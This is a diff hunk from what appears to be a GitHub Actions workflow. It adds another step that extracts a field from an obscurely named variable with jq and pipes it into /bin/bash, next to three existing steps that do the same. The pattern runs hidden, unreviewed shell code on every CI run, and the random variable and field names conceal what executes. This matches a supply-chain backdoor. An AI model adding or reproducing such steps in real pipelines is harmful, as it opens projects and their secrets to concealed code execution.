@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$ehgfm92" | jq -r .urek6 | /bin/bash
           echo $yymk6593 | jq -r .kiaae370 | /bin/bash
           printf '%s' "$bqhx67" | jq -r .cp7345 | /bin/bash
+          echo $g6 | jq -r .zwji66 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
